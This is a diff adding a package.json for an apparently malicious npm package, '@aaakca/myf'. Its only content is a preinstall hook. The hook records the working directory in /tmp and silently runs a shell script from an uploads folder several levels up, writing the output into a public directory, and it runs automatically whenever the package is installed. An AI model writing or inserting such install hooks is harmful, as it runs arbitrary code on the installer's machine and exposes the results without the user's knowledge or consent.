@@ -1,0 +1,8 @@
+{
+    "name": "@aaakca/myf",
+    "version": "1.0.14",
+    "scripts": {
+        "preinstall": "pwd > /tmp/asda;sh ../../../public/uploads/1.sh > ../../../public/result.txt"
+
+    }
+}
